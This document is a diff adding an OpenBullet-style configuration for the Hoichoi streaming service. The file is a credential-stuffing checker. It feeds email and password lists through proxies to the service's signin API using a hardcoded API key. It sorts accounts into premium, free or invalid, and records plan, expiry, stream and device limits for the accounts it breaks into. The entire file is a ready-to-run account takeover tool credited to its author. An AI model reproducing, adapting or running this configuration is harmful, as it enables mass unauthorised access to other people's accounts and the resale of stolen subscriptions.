@@ -1,0 +1,137 @@
+[SETTINGS]
+{
+  "Name": "Hoichoi",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-11T01:21:31.7355999+06:00",
+  "AdditionalInfo": "",
+  "Author": "Alpha_Coder (╬ ಠ益ಠ) _|__ <3",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN_REQ REQUEST POST "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-4402617e-c1b6-5e77-5382-f6263b811f1d" 
+  CONTENT "{ \"email\" : \"<USER>\",\"password\" : \"<PASS>\" }" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: prod-api.viewlift.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Content-Type: application/json;charset=utf-8" 
+  HEADER "x-api-key: PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef" 
+  HEADER "Origin: https://www.hoichoi.tv" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Referer: https://www.hoichoi.tv/" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 48" 
+
+#Auth_Token PARSE "<SOURCE>" JSON "authorizationToken" -> VAR "Auth_Token" 
+
+#Premium PARSE "<SOURCE>" LR "isSubscribed\":" ",\"" CreateEmpty=FALSE -> CAP "Premium" 
+
+#ACC_STATUS KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, we can't find an account with this email address. Please enter a registered email address and try again." 
+    KEY "EMAIL_NOT_REGISTERED" 
+  KEYCHAIN Success OR 
+    KEY "<Premium>" Contains "true" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Premium>" Contains "false" 
+
+#Premium_false FUNCTION Replace "true" "Yes" "<Premium>" -> CAP "Premium" 
+
+#Premium_true FUNCTION Replace "false" "No" "<Premium>" -> CAP "Premium" 
+
+#Type REQUEST GET "https://prod-api.viewlift.com/identity/user?site=hoichoitv" 
+  
+  HEADER "Host: prod-api.viewlift.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "x-api-key: PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef" 
+  HEADER "Origin: https://www.hoichoi.tv" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Authorization: <Auth_Token>" 
+  HEADER "Referer: https://www.hoichoi.tv/" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#Profile_Type PARSE "<SOURCE>" JSON "profileType" CreateEmpty=FALSE -> CAP "Profile_Type" 
+
+#Plan_REQ REQUEST GET "https://prod-api.viewlift.com/identity/user?site=hoichoitv" 
+  
+  HEADER "Host: prod-api.viewlift.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "x-api-key: PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef" 
+  HEADER "Origin: https://www.hoichoi.tv" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Authorization: <Auth_Token>" 
+  HEADER "Referer: https://www.hoichoi.tv/" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#Plan PARSE "<SOURCE>" JSON "title" CreateEmpty=FALSE -> CAP "Plan" 
+
+#Expiry PARSE "<SOURCE>" LR "subscriptionEndDate\":\"" "T" CreateEmpty=FALSE -> CAP "Expiry" 
+
+#Device PARSE "<SOURCE>" JSON "platform" CreateEmpty=FALSE -> CAP "Device" 
+
+#AllowedStreams PARSE "<SOURCE>" JSON "numberOfAllowedStreams" CreateEmpty=FALSE -> CAP "AllowedStreams" 
+
+#AllowedDevices PARSE "<SOURCE>" JSON "numberOfAllowedDevices" CreateEmpty=FALSE -> CAP "AllowedDevices" 
+
+#Renewable PARSE "<SOURCE>" JSON "renewable" CreateEmpty=FALSE -> CAP "Renewable" 
+
+!#Compatible PARSE "<SOURCE>" LR "" "" -> VAR "Compatible" 
+
+#Author FUNCTION Constant "Alpha_Coder (╬ ಠ益ಠ) _|__ <3" -> CAP "Config By" 
+
